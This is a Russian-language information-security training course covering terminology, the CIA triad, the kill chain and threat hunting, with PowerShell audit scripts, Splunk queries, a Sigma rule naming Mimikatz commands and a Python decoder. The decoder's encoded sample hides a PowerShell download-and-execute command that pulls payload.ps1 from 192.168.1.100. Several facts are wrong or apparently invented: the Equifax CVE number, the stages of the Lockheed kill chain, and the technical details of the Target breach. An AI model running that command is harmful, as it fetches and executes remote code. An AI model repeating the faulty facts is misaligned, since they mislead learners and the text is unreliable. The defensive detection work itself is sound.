# Учебно-практический стандарт по защите информации
```mermaid
graph TD
    A[Введение в информационную безопасность] --> B[1. Ключевые термины и понятия в ИБ]
    A --> C[2. Кибербезопасность и модели угроз]
    A --> D[3. Виды атак]
    A --> E[4. Криптография и стеганография]
    A --> F[5. Оценка рисков и управление угрозами]
    A --> G[6. Средства защиты информации]
    A --> H[7. Стандарты и регулирование в ИБ]

    B --> B1[Информация по ГОСТ 7.0-99]
    B --> B2[CIA-триада]
    B --> B3[Идентификация/Аутентификация/Авторизация]
    B --> B4[Угрозы/Уязвимости/Риски]

    C --> C1[Cyber-Kill Chain 7 этапов]
    C --> C2[Threat Hunting гипотезы]
    C --> C3[IOC индикаторы компрометации]
    C --> C4[SOC L1/L2/L3 структура]

    D --> D1[Фишинг BEC атака]
    D --> D2[Атаки на пароли Credential Stuffing]
    D --> D3[DDoS Amplification]
    D --> D4[Supply Chain NotPetya]
    D --> D5[Эксплуатация CVE]

    E --> E1[Симметричное AES ГОСТ 28147]
    E --> E2[Асимметричное RSA ГОСТ 34.10]
    E --> E3[Хеширование ГОСТ 34.11]
    E --> E4[Стеганография LSB DCT]

    F --> F1[Качественная оценка рисков]
    F --> F2[Количественная Монте-Карло]
    F --> F3[NIST CSF 5 функций]
    F --> F4[ISO 27005 процесс]

    G --> G1[СЗИ КСЗИ классификация]
    G --> G2[DLP IDS IPS SIEM SOAR]
    G --> G3[Firewall WAF UEBA SGRC]

    H --> H1[ISO 27001-27005]
    H --> H2[ГОСТ Р 27001-2021]
    H --> H3[152-ФЗ 149-ФЗ 187-ФЗ]
    H --> H4[ФСТЭК приказы 17 21 31]

    classDef main fill:#1e3a8a,stroke:#1e40af,stroke-width:3px,color:#fff;
    classDef section fill:#3b82f6,stroke:#2563eb,stroke-width:2px,color:#fff;
    classDef subsection fill:#93c5fd,stroke:#60a5fa,stroke-width:1px,color:#000;

    class A main
    class B,C,D,E,F,G,H section
    class B1,B2,B3,B4,C1,C2,C3,C4,D1,D2,D3,D4,D5,E1,E2,E3,E4,F1,F2,F3,F4,G1,G2,G3,H1,H2,H3,H4 subsection
```

---
# Модуль 1. КЛЮЧЕВЫЕ ТЕРМИНЫ И ПОНЯТИЯ В ИБ

## 1.1. Основные определения (согласно ГОСТ и ISO)

| Термин | Определение | Нормативный документ | Примечание |
|--------|-------------|---------------------|------------|
| **Информация** | Сведения (сообщения, данные) независимо от формы представления | ГОСТ 7.0-99, ISO 5127:2017 | Базовое понятие ИБ |
| **Безопасность информации** | Состояние защищённости, при котором обеспечены конфиденциальность, целостность и доступность | ISO/IEC 27001, ГОСТ Р ИСО/МЭК 27001-2021 | CIA-триада |
| **Информационная безопасность** | Комплекс организационно-технических мероприятий, обеспечивающих защиту информации | 149-ФЗ «Об информации» | Системный подход |
| **Угроза безопасности** | Совокупность условий и факторов, создающих опасность нарушения безопасности | ГОСТ Р 53114-2008 | Источники: внешние/внутренние |
| **Уязвимость** | Свойство системы, обусловливающее возможность реализации угроз | ISO/IEC 27005 | CVE, CWE каталоги |
| **Риск** | Сочетание вероятности нанесения ущерба и тяжести этого ущерба | ISO/IEC 27005, ГОСТ Р ИСО/МЭК 27005-2021 | Риск = Вероятность × Воздействие |
| **Инцидент ИБ** | Событие, которое может привести к нарушению безопасности информации | ГОСТ Р ИСО/МЭК 27001-2021 | Требует реагирования |
| **Персональные данные** | Любая информация, относящаяся к прямо или косвенно определённому физическому лицу | 152-ФЗ ст. 3 | Особый режим защиты |

## 1.2. CIA-триада (базовые свойства информации)

```mermaid
graph TD
    A[Информационная Безопасность] --> B[Конфиденциальность<br/>Confidentiality]
    A --> C[Целостность<br/>Integrity]
    A --> D[Доступность<br/>Availability]

    B --> B1[Шифрование AES-256]
    B --> B2[Контроль доступа RBAC]
    B --> B3[DLP системы]

    C --> C1[Хеширование SHA-256]
    C --> C2[Цифровая подпись ГОСТ 34.10]
    C --> C3[FIM мониторинг]

    D --> D1[Резервирование RAID]
    D --> D2[Отказоустойчивость Cluster]
    D --> D3[DDoS защита]

    style A fill:#1e3a8a,color:#fff,stroke-width:3px
    style B fill:#3b82f6,color:#fff
    style C fill:#3b82f6,color:#fff
    style D fill:#3b82f6,color:#fff
    style B1 fill:#93c5fd,color:#000
    style C1 fill:#93c5fd,color:#000
    style D1 fill:#93c5fd,color:#000
```

### 1.2.1. Практическое применение CIA-триады (реальные кейсы)

| Свойство | Реальный кейс | Технические детали | Последствия | Меры защиты |
|----------|---------------|-------------------|-------------|-------------|
| **Конфиденциальность** | Equifax (2017) | CVE-2017-5632, Apache Struts, 147 млн записей | Штраф $700 млн, репутационный ущерб | Шифрование данных, WAF, регулярное обновление |
| **Целостность** | NotPetya (2017) | M.E.Doc обновление, EternalBlue, шифрование MFT | Ущерб > $10 млрд, Maersk $300 млн | Резервные копии 3-2-1, FIM, цифровая подпись |
| **Доступность** | GitHub DDoS (2018) | Memcached amplification, 1.35 Tbps, 8 минут | Простой сервиса, потеря доверия | Scrubbing centers, rate limiting, Anycast |
| **Конфиденциальность** | Yahoo (2014) | SQL injection, 500 млн учёток, MD5 хеши | Скидка $350 млн при продаже Verizon | MFA, хеширование Argon2, мониторинг утечек |
| **Целостность** | SolarWinds (2020) | Supply chain, Sunburst backdoor, 18000 организаций | Компрометация правительственных сетей | SBOM, проверка подписей, изоляция обновлений |

## 1.3. Процессы контроля доступа (по ФСТЭК)

```mermaid
sequenceDiagram
    participant U as Пользователь
    participant S as Система контроля доступа
    participant AD as Active Directory
    participant DB as База данных
    participant AUD as Система аудита

    U->>S: 1. Идентификация (логин)
    S->>AD: 2. Проверка идентификатора
    AD-->>S: Результат проверки
    S->>U: 3. Запрос аутентификации
    U->>S: 4. Предоставление учётных данных (пароль/OTP/биометрия)
    S->>AD: 5. Верификация учётных данных
    AD-->>S: Результат верификации
    S->>AUD: 6. Логирование события (EventID 4624/4625)
    S->>U: 7. Решение (доступ/отказ)
    U->>S: 8. Запрос ресурса
    S->>DB: 9. Проверка авторизации (ACL)
    DB-->>S: Права доступа
    S->>AUD: 10. Логирование доступа (EventID 4663)
    S->>U: 11. Предоставление доступа к ресурсу

    Note over S,AUD: ФСТЭК требование 4.1<br/>Обязательное логирование
```

### 1.3.1. Практическая реализация (PowerShell + ФСТЭК)

```powershell
#==============================================================================
# АУДИТ ПОЛИТИК ПАРОЛЕЙ В ACTIVE DIRECTORY (СОГЛАСНО ФСТЭК №21)
# Требования: Минимальная длина ≥8, История ≥5, Срок действия ≤90 дней
#==============================================================================

function Get-FSTECPasswordPolicy {
    [CmdletBinding()]
    param()
    
    Write-Host "=== АУДИТ ПОЛИТИК ПАРОЛЕЙ (ФСТЭК №21) ===" -ForegroundColor Cyan
    Write-Host "Дата проверки: $(Get-Date -Format 'dd.MM.yyyy HH:mm')" -ForegroundColor Gray
    Write-Host ""
    
    # Получение политик паролей домена
    $policy = Get-ADDefaultDomainPasswordPolicy
    
    # Проверка минимальной длины пароля (Требование ФСТЭК: ≥8 символов)
    Write-Host "[1/6] Минимальная длина пароля:" -ForegroundColor Yellow
    if ($policy.MinPasswordLength -ge 8) {
        Write-Host "  ✅ PASS: $($policy.MinPasswordLength) символов (требование: ≥8)" -ForegroundColor Green
    } else {
        Write-Host "  ❌ FAIL: $($policy.MinPasswordLength) символов (требование: ≥8)" -ForegroundColor Red
    }
    
    # Проверка истории паролей (Требование ФСТЭК: ≥5)
    Write-Host "[2/6] История паролей:" -ForegroundColor Yellow
    if ($policy.PasswordHistoryCount -ge 5) {
        Write-Host "  ✅ PASS: $($policy.PasswordHistoryCount) паролей (требование: ≥5)" -ForegroundColor Green
    } else {
        Write-Host "  ❌ FAIL: $($policy.PasswordHistoryCount) паролей (требование: ≥5)" -ForegroundColor Red
    }
    
    # Проверка максимального срока действия (Требование ФСТЭК: ≤90 дней)
    Write-Host "[3/6] Максимальный срок действия пароля:" -ForegroundColor Yellow
    $maxAgeDays = $policy.MaxPasswordAge.Days
    if ($maxAgeDays -le 90 -and $maxAgeDays -gt 0) {
        Write-Host "  ✅ PASS: $maxAgeDays дней (требование: ≤90)" -ForegroundColor Green
    } else {
        Write-Host "  ❌ FAIL: $maxAgeDays дней (требование: ≤90)" -ForegroundColor Red
    }
    
    # Проверка сложности пароля
    Write-Host "[4/6] Требование сложности пароля:" -ForegroundColor Yellow
    if ($policy.ComplexityEnabled) {
        Write-Host "  ✅ PASS: Сложность включена" -ForegroundColor Green
    } else {
        Write-Host "  ❌ FAIL: Сложность выключена" -ForegroundColor Red
    }
    
    # Проверка блокировки учётной записи
    Write-Host "[5/6] Порог блокировки учётной записи:" -ForegroundColor Yellow
    if ($policy.LockoutThreshold -ge 5 -and $policy.LockoutThreshold -le 10) {
        Write-Host "  ✅ PASS: $($policy.LockoutThreshold) попыток (рекомендация: 5-10)" -ForegroundColor Green
    } else {
        Write-Host "  ⚠️  WARNING: $($policy.LockoutThreshold) попыток (рекомендация: 5-10)" -ForegroundColor Yellow
    }
    
    # Проверка обратимого шифрования (должно быть отключено)
    Write-Host "[6/6] Обратимое шифрование паролей:" -ForegroundColor Yellow
    $reversible = Get-ADDomain | Select-Object -ExpandProperty DomainControllers | 
        Get-ADObject -Filter {ReversiblePasswordEncryptionEnabled -eq $true}
    if ($reversible) {
        Write-Host "  ❌ FAIL: Обратимое шифрование включено (КРИТИЧНО!)" -ForegroundColor Red
    } else {
        Write-Host "  ✅ PASS: Обратимое шифрование отключено" -ForegroundColor Green
    }
    
    Write-Host ""
    Write-Host "=== ОТЧЁТ СОХРАНЁН: $(Get-Date -Format 'yyyyMMdd_HHmmss')_PasswordAudit.txt ===" -ForegroundColor Cyan
}

# Поиск пользователей с нарушенными политиками
function Get-NonCompliantUsers {
    Write-Host "=== ПОИСК ПОЛЬЗОВАТЕЛЕЙ С НАРУШЕННЫМИ ПОЛИТИКАМИ ===" -ForegroundColor Cyan
    
    # Пользователи с паролями, которые не истекают
    Write-Host "`n[1] Пользователи с неменяемыми паролями:" -ForegroundColor Yellow
    Get-ADUser -Filter "PasswordNeverExpires -eq '$true'" -Properties PasswordNeverExpires | 
        Select-Object Name, Enabled, DistinguishedName | 
        Format-Table -AutoSize
    
    # Пользователи с пустыми паролями
    Write-Host "`n[2] Пользователи с пустыми паролями:" -ForegroundColor Yellow
    Search-ADAccount -PasswordNotRequired | 
        Select-Object Name, DistinguishedName | 
        Format-Table -AutoSize
    
    # Неактивные пользователи (>90 дней)
    Write-Host "`n[3] Неактивные пользователи (>90 дней):" -ForegroundColor Yellow
    Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 | 
        Select-Object Name, LastLogonDate, DistinguishedName | 
        Format-Table -AutoSize
}

# Выполнение аудита
Get-FSTECPasswordPolicy
Get-NonCompliantUsers
```

## 1.4. Вредоносные программы (классификация по ФСТЭК)

| Тип | Определение | Пример | Технические индикаторы | Меры защиты |
|-----|-------------|--------|----------------------|-------------|
| **Компьютерный вирус** | Программа, создающая копии и внедряющая их в файлы | ILOVEYOU (2000), Melissa | Изменение файлов, автозапуск | Антивирус, контроль исполняемых файлов, AppLocker |
| **Троян** | Программа, маскирующаяся под легитимную | Citadel (Target 2013), Emotet | Скрытые процессы, C2-коммуникация | EDR, песочница, мониторинг сети |
| **Ransomware** | Программа, шифрующая данные для выкупа | NotPetya (2017), WannaCry, LockBit | Шифрование файлов, требование выкупа | Резервные копии 3-2-1, сегментация, FIM |
| **Spyware** | Программа для сбора конфиденциальной информации | Keylogger, RedShell | Кейлоггинг, скриншоты, микрофон | DLP, мониторинг процессов, UEBA |
| **Rootkit** | Программа, скрывающая своё присутствие | Flame (2012), TDL4 | Скрытие процессов, hooks ядра | Целостность ядра, FIM, загрузка с доверенного носителя |
| **Worm** | Самовоспроизводящаяся программа | Conficker, SQL Slammer | Сетевое распространение, сканирование портов | Сегментация сети, патч-менеджмент |
| **Botnet** | Сеть заражённых устройств | Mirai, Zeus | DDoS, спам, C2-коммуникация | IDS/IPS, мониторинг трафика, изоляция |

### 1.4.1. Практическое обнаружение вредоносных программ

```powershell
#==============================================================================
# ОБНАРУЖЕНИЕ ПРИЗНАКОВ ВРЕДОНОСНОЙ АКТИВНОСТИ (ФСТЭК ТРЕБОВАНИЕ 6.2)
#==============================================================================

function Get-MalwareIndicators {
    [CmdletBinding()]
    param()
    
    Write-Host "=== ПРОВЕРКА НА ПРИЗНАКИ ВРЕДОНОСНОЙ АКТИВНОСТИ ===" -ForegroundColor Cyan
    Write-Host "Дата: $(Get-Date -Format 'dd.MM.yyyy HH:mm')" -ForegroundColor Gray
    Write-Host ""
    
    # 1. Подозрительные процессы с высоким потреблением ресурсов
    Write-Host "[1/7] Подозрительные процессы (CPU >90% или Memory >500MB):" -ForegroundColor Yellow
    Get-Process | Where-Object {
        $_.CPU -gt 90 -or $_.WorkingSet -gt 500MB
    } | Select-Object Name, Id, CPU, @{Name='Memory(MB)';Expression={[math]::Round($_.WorkingSet/1MB,2)}} | 
        Format-Table -AutoSize
    
    # 2. Автозагрузка (признак персистентности)
    Write-Host "`n[2/7] Программы в автозагрузке:" -ForegroundColor Yellow
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run | 
        Select-Object -ExpandProperty PSObject.Properties | 
        Where-Object {$_.Name -notlike 'PS*'} |
        Select-Object Name, Value | Format-Table -AutoSize
    
    Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run | 
        Select-Object -ExpandProperty PSObject.Properties | 
        Where-Object {$_.Name -notlike 'PS*'} |
        Select-Object Name, Value | Format-Table -AutoSize
    
    # 3. Подозрительные сетевые подключения
    Write-Host "`n[3/7] Активные сетевые подключения (ESTABLISHED):" -ForegroundColor Yellow
    Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | 
        Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | 
        Format-Table -AutoSize
    
    # 4. Подозрительные службы
    Write-Host "`n[4/7] Службы с подозрительными путями:" -ForegroundColor Yellow
    Get-Service | Where-Object {
        $_.PathName -like '*temp*' -or 
        $_.PathName -like '*appdata*' -or 
        $_.PathName -like '*users*'
    } | Select-Object Name, DisplayName, StartType, Status | Format-Table -AutoSize
    
    # 5. Подозрительные задания планировщика
    Write-Host "`n[5/7] Задания планировщика с PowerShell:" -ForegroundColor Yellow
    Get-ScheduledTask | Where-Object {
        $_.Actions.Execute -like '*powershell*' -or 
        $_.Actions.Execute -like '*cmd*'
    } | Select-Object TaskName, State, TaskPath | Format-Table -AutoSize
    
    # 6. Проверка хэшей критических файлов
    Write-Host "`n[6/7] Проверка целостности системных файлов:" -ForegroundColor Yellow
    $systemFiles = @(
        "C:\Windows\System32\cmd.exe",
        "C:\Windows\System32\powershell.exe",
        "C:\Windows\System32\svchost.exe"
    )
    
    foreach ($file in $systemFiles) {
        if (Test-Path $file) {
            $hash = Get-FileHash $file -Algorithm SHA256
            Write-Host "  $file : $($hash.Hash.Substring(0,16))..." -ForegroundColor Gray
        }
    }
    
    # 7. Проверка привилегированных групп
    Write-Host "`n[7/7] Члены группы Domain Admins:" -ForegroundColor Yellow
    Get-ADGroupMember "Domain Admins" -ErrorAction SilentlyContinue | 
        Select-Object Name, ObjectClass, DistinguishedName | 
        Format-Table -AutoSize
    
    Write-Host ""
    Write-Host "=== ПРОВЕРКА ЗАВЕРШЕНА ===" -ForegroundColor Green
}

Get-MalwareIndicators
```
## Список литературы 
1. Малюк А.А. — _Информационная безопасность: концептуальные и методологические основы защиты информации_. — М.: Горячая линия-Телеком.
2. Шаньгин В.Ф. — _Информационная безопасность компьютерных систем и сетей_. — М.: ФОРУМ.
3. Домарев В.В. — _Безопасность информационных технологий_. — М.: Диалог-МИФИ.
4. ГОСТ Р 50922-2006 — Защита информации. Основные термины и определения.
5. ГОСТ Р ИСО/МЭК 27000-2012 — Системы менеджмента информационной безопасности. Общий обзор.
---
# Модуль 2. КИБЕРБЕЗОПАСНОСТЬ И МОДЕЛИ УГРОЗ

## 2.1. Cyber-Kill Chain (Lockheed Martin)

### 2.1.1. Модель из 7 этапов (детализированная)

```mermaid
graph LR
    A[1. Рекогносцировка<br/>Reconnaissance] --> B[2. Доставка<br/>Delivery]
    B --> C[3. Эксплуатация<br/>Exploitation]
    C --> D[4. Установка<br/>Installation]
    D --> E[5. C2-коммуникация<br/>Command & Control]
    E --> F[6. Подъем привилегий<br/>Privilege Escalation]
    F --> G[7. Достижение целей<br/>Actions on Objectives]

    style A fill:#e1f5ff,stroke:#0288d1,stroke-width:2px
    style B fill:#ffe1e1,stroke:#d32f2f,stroke-width:2px
    style C fill:#fff4e1,stroke:#f57c00,stroke-width:2px
    style D fill:#e8ffe1,stroke:#388e3c,stroke-width:2px
    style E fill:#f0e1ff,stroke:#7b1fa2,stroke-width:2px
    style F fill:#ffe1f4,stroke:#c2185b,stroke-width:2px
    style G fill:#ffe1e1,stroke:#d32f2f,stroke-width:2px
```

### 2.1.2. Реальный кейс: Атака на Target (2013) — детальный анализ

| Этап                     | Действия злоумышленника                                                    | Технические индикаторы                           | MITRE ATT&CK | Меры защиты (ФСТЭК)                                     |
| ------------------------ | -------------------------------------------------------------------------- | ------------------------------------------------ | ------------ | ------------------------------------------------------- |
| **1. Рекогносцировка**   | OSINT подрядчика Fazio Mechanical, сбор email через LinkedIn, theHarvester | DNS-запросы whois, nslookup, Shodan сканирование | T1592, T1590 | Минимизация публичной информации, мониторинг упоминаний |
| **2. Доставка**          | Фишинговое письмо Invoice_4521.pdf.exe, поддельный домен hvac-supplies.com | SPF fail, вложение .exe, поддельный отправитель  | T1566.001    | SPF/DKIM/DMARC, песочница вложений, обучение            |
| **3. Эксплуатация**      | CVE-2010-2729 (Print Spooler), MS10-061, переполнение буфера               | EventID 4688, процесс spoolsv.exe, порт 445      | T1211, T1203 | Регулярное обновление (WSUS), патч-менеджмент           |
| **4. Установка**         | Citadel Trojan, бэкдор, кейлоггер, скрытая учётная запись                  | Автозагрузка Run, скрытые процессы, EventID 4720 | T1547, T1053 | EDR, мониторинг автозагрузки, FIM                       |
| **5. C2**                | HTTPS к серверу в России (порт 443), DGA-домены, heartbeat 30 мин          | DNS-запросы x7k2m9p4q1.ru, IP 185.234.72.15      | T1071, T1568 | DNS-фильтрация, NetFlow анализ, TLS инспекция           |
| **6. Подъём привилегий** | Pass-the-Hash, Mimikatz, Domain Admin, LSASS-дамп                          | EventID 4624 (Type 3), процесс mimikatz.exe      | T1003, T1550 | LAPS, Protected Users, Credential Guard                 |
| **7. Достижение целей**  | POS-терминалы, кража 40 млн карт, FTP-экфильтрация                         | FTP-трафик, EventID 4663 (доступ к файлам)       | T1078, T1567 | Сегментация сети, DLP, мониторинг эксфильтрации         |

### 2.1.3. Практическое обнаружение (PowerShell + SIEM)

```powershell
#==============================================================================
# ОБНАРУЖЕНИЕ ЭТАПОВ CYBER-KILL CHAIN (ФСТЭК ТРЕБОВАНИЕ 7.2)
#==============================================================================

function Get-KillChainIndicators {
    [CmdletBinding()]
    param()
    
    Write-Host "=== ОБНАРУЖЕНИЕ ЭТАПОВ CYBER-KILL CHAIN ===" -ForegroundColor Cyan
    Write-Host "Дата: $(Get-Date -Format 'dd.MM.yyyy HH:mm')" -ForegroundColor Gray
    Write-Host ""
    
    # Этап 1: Рекогносцировка (внешние сканирования)
    Write-Host "[Этап 1] Рекогносцировка - Внешние сканирования:" -ForegroundColor Yellow
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 100 | 
        Where-Object {$_.Message -like '*Logon Type: 3*'} | 
        Select-Object TimeCreated, @{Name='Account';Expression={$_.Message -replace '(?s).*Account Name:\s+([^\n]+).*','$1'}} | 
        Format-Table -AutoSize
    
    # Этап 2: Доставка (фишинг)
    Write-Host "`n[Этап 2] Доставка - Подозрительные вложения:" -ForegroundColor Yellow
    Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational';Id=1121} -MaxEvents 50 | 
        Select-Object TimeCreated, Message | 
        Format-Table -AutoSize
    
    # Этап 3: Эксплуатация (уязвимости)
    Write-Host "`n[Этап 3] Эксплуатация - Процессы с уязвимостями:" -ForegroundColor Yellow
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 100 | 
        Where-Object {$_.Message -like '*powershell*' -or $_.Message -like '*cmd.exe*'} | 
        Select-Object TimeCreated, @{Name='Process';Expression={$_.Message -replace '(?s).*Process Name:\s+([^\n]+).*','$1'}} | 
        Format-Table -AutoSize
    
    # Этап 4: Установка (автозагрузка)
    Write-Host "`n[Этап 4] Установка - Новая автозагрузка:" -ForegroundColor Yellow
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698} -MaxEvents 50 | 
        Select-Object TimeCreated, @{Name='TaskName';Expression={$_.Message -replace '(?s).*Task Name:\s+([^\n]+).*','$1'}} | 
        Format-Table -AutoSize
    
    # Этап 5: C2 (сетевые подключения)
    Write-Host "`n[Этап 5] C2 - Подозрительные подключения:" -ForegroundColor Yellow
    Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | 
        Select-Object LocalAddress, RemoteAddress, RemotePort, OwningProcess | 
        Format-Table -AutoSize
    
    # Этап 6: Подъём привилегий
    Write-Host "`n[Этап 6] Подъём привилегий - Добавление в группы:" -ForegroundColor Yellow
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4728} -MaxEvents 50 | 
        Select-Object TimeCreated, @{Name='Member';Expression={$_.Message -replace '(?s).*Member Name:\s+([^\n]+).*','$1'}} | 
        Format-Table -AutoSize
    
    # Этап 7: Достижение целей (доступ к данным)
    Write-Host "`n[Этап 7] Достижение целей - Доступ к чувствительным файлам:" -ForegroundColor Yellow
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4663} -MaxEvents 100 | 
        Where-Object {$_.Message -like '*credit*' -or $_.Message -like '*card*' -or $_.Message -like '*password*'} | 
        Select-Object TimeCreated, @{Name='Object';Expression={$_.Message -replace '(?s).*Object Name:\s+([^\n]+).*','$1'}} | 
        Format-Table -AutoSize
    
    Write-Host ""
    Write-Host "=== АНАЛИЗ ЗАВЕРШЁН ===" -ForegroundColor Green
}

Get-KillChainIndicators
```

## 2.2. Threat Hunting (Проактивный поиск угроз)

### 2.2.1. Процесс Threat Hunting (согласно ФСТЭК)

```mermaid
graph TB
    A[Формулирование гипотезы] --> B[Сбор данных из SIEM]
    B --> C[Анализ и расследование]
    C --> D{Найдены аномалии?}
    D -->|Да| E[Реакция на инцидент]
    D -->|Нет| F[Обновление гипотезы]
    E --> G[Блокировка угрозы]
    F --> A
    G --> H[Документирование по ФСТЭК форма 7-И]
    H --> A

    style A fill:#3b82f6,color:#fff,stroke-width:2px
    style E fill:#ef4444,color:#fff,stroke-width:2px
    style G fill:#10b981,color:#fff,stroke-width:2px
    style H fill:#8b5cf6,color:#fff,stroke-width:2px
```

### 2.2.2. Реальный сценарий: Поиск Mimikatz (детальный)

**Гипотеза**: *«Злоумышленник использует PowerShell для латерального перемещения после успешной фишинговой атаки»*

**Индикаторы для поиска**:
- PowerShell с флагами `-enc` или `-EncodedCommand`
- Множественные подключения WinRM между рабочими станциями
- Выполнение PowerShell из необычных директорий (Temp, AppData)
- Аномальное количество процессов powershell.exe
- Доступ к LSASS (Process Access EventID 4680)

**SIEM-запросы (Splunk + ФСТЭК)**:

```spl
#==============================================================================
# THREAT HUNTING: ПОИСК MIMIKATZ И CREDENTIAL DUMPING (ФСТЭК 6.2)
#==============================================================================

# Поиск закодированных PowerShell команд
index=windows EventCode=4688 
| search CommandLine="*powershell*" 
| search CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*-e *"
| table _time, host, user, CommandLine, ParentImage
| sort -_time
| head 100

# Поиск Mimikatz по сигнатурам командной строки
index=windows EventCode=4688 
| search (CommandLine="*sekurlsa*" OR CommandLine="*mimikatz*" OR CommandLine="*logonpasswords*" 
          OR CommandLine="*lsadump*" OR CommandLine="*dcsync*" OR CommandLine="*privilege::debug*")
| table _time, host, user, CommandLine, ParentImage
| sort -_time

# Поиск доступа к LSASS (Process Access)
index=windows EventCode=4680 
| search TargetImage="*lsass.exe"
| table _time, host, user, SourceImage, TargetImage, AccessMask
| sort -_time

# Латеральное перемещение через WinRM
index=windows EventCode=16 
| search ConnectionStatus="Connected"
| stats dc(dest_ip) as unique_destinations by src_ip, user
| where unique_destinations > 10
| table src_ip, user, unique_destinations

# PowerShell из подозрительных директорий
index=windows EventCode=4688 
| search CommandLine="*powershell*"
| search (CommandLine="*\\temp\\*" OR CommandLine="*\\appdata\\*" OR CommandLine="*\\users\\public\\*")
| table _time, host, user, CommandLine
| sort -_time
```

**Sigma-правило для SIEM (ФСТЭК совместимое)**:

```yaml
title: Mimikatz Credential Dumping Detection
status: stable
description: Detects Mimikatz use through command line and process access
author: Security Team
date: 2024/01/15
modified: 2026/03/04
references:
    - https://attack.mitre.org/techniques/T1003/
    - ФСТЭК России Приказ №17 требование 6.2
tags:
    - mitre_attack.T1003
    - mitre_attack.T1003.001
    - фстэк.требование.6.2
    - нсиб.класс.1
logsource:
    category: process_creation
    product: windows
detection:
    selection_cmd:
        CommandLine|contains:
            - 'sekurlsa::logonpasswords'
            - 'lsadump::lsa'
            - 'lsadump::dcsync'
            - 'privilege::debug'
            - 'mimikatz'
            - 'mimilib'
    selection_access:
        EventID: 4680
        TargetImage|endswith: 'lsass.exe'
        AccessMask|contains:
            - '0x1FFFFF'
            - '0x1010'
    condition: selection_cmd or selection_access
falsepositives:
    - Penetration testing (согласованное)
    - Security tools (EDR, антивирус)
level: critical
```

### 2.2.3. Практический анализ (Python + декодирование)

```python
#==============================================================================
# THREAT HUNTING: DECODE POWERSHELL COMMANDS (ФСТЭК 7.2)
#==============================================================================

import base64
import re
import json
from datetime import datetime

class PowerShellAnalyzer:
    """Анализ PowerShell команд для Threat Hunting"""
    
    def __init__(self):
        self.mitre_techniques = {
            "DownloadString": "T1105 - Ingress Tool Transfer",
            "IEX": "T1059.001 - PowerShell",
            "Net.WebClient": "T1105 - Remote File Copy",
            "Invoke-Expression": "T1059.001 - PowerShell",
            "Start-Process": "T1059.001 - PowerShell",
            "Get-Process": "T1082 - System Information Discovery",
            "Get-NetTCPConnection": "T1049 - System Network Connections Discovery",
            "certutil": "T1140 - Deobfuscate/Decode Files",
            "bitsadmin": "T1197 - BITS Jobs"
        }
    
    def decode_powershell(self, encoded_cmd):
        """Декодирует base64 PowerShell команды"""
        try:
            # PowerShell использует UTF-16LE encoding
            decoded = base64.b64decode(encoded_cmd).decode('utf-16le')
            return decoded
        except Exception as e:
            return f"Error: {str(e)}"
    
    def analyze_command(self, command):
        """Анализирует команду на техники MITRE ATT&CK"""
        findings = []
        
        for technique, description in self.mitre_techniques.items():
            if technique.lower() in command.lower():
                findings.append({
                    "technique": technique,
                    "description": description,
                    "severity": "HIGH" if technique in ["IEX", "DownloadString"] else "MEDIUM"
                })
        
        return findings
    
    def calculate_entropy(self, string):
        """Вычисляет энтропию строки для обнаружения обфускации"""
        import math
        from collections import Counter
        
        if not string:
            return 0
        
        prob = [float(string.count(c)) / len(string) for c in set(string)]
        entropy = -sum(p * math.log2(p) for p in prob if p > 0)
        
        return entropy
    
    def detect_obfuscation(self, command):
        """Обнаруживает обфускацию в команде"""
        indicators = []
        
        # Высокая энтропия (признак кодирования)
        entropy = self.calculate_entropy(command)
        if entropy > 4.5:
            indicators.append(f"High entropy: {entropy:.2f}")
        
        # Множественные замены
        if command.count('-replace') > 3:
            indicators.append("Multiple string replacements")
        
        # Concatenation
        if command.count('+') > 10:
            indicators.append("Excessive string concatenation")
        
        # Special characters
        if re.search(r'[`^@]', command):
            indicators.append("Special escape characters")
        
        return indicators
    
    def generate_report(self, encoded_cmd):
        """Генерирует отчёт по команде"""
        decoded = self.decode_powershell(encoded_cmd)
        techniques = self.analyze_command(decoded)
        obfuscation = self.detect_obfuscation(decoded)
        
        report = {
            "timestamp": datetime.now().isoformat(),
            "encoded": encoded_cmd,
            "decoded": decoded,
            "entropy": self.calculate_entropy(decoded),
            "techniques": techniques,
            "obfuscation_indicators": obfuscation,
            "risk_level": "CRITICAL" if techniques else "MEDIUM" if obfuscation else "LOW"
        }
        
        return report

# Пример использования
if __name__ == "__main__":
    analyzer = PowerShellAnalyzer()
    
    # Найденная подозрительная команда (из реального инцидента)
    suspicious_cmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
    
    report = analyzer.generate_report(suspicious_cmd)
    
    print("=" * 80)
    print("THREAT HUNTING REPORT - PowerShell Analysis")
    print("=" * 80)
    print(f"Timestamp: {report['timestamp']}")
    print(f"Risk Level: {report['risk_level']}")
    print(f"Entropy: {report['entropy']:.2f}")
    print(f"\nDecoded Command:\n{report['decoded']}")
    print(f"\nMITRE ATT&CK Techniques:")
    for tech in report['techniques']:
        print(f"  ⚠️  {tech['technique']}: {tech['description']} [{tech['severity']}]")
    print(f"\nObfuscation Indicators:")
    for ind in report['obfuscation_indicators']:
        print(f"  🔍 {ind}")
    print("=" * 80)
```

## 2.3. IOC (Indicators of Compromise)

### 2.3.1. Типы IOC (по ФСТЭК России)

| Тип IOC | Примеры | Применение | ФСТЭК требование |
|---------|---------|------------|-----------------|
| **Файлы** | MD5/SHA256 хэши, имена файлов, пути | Проверка целостности, EDR, антивирус | Требование 6.2 |
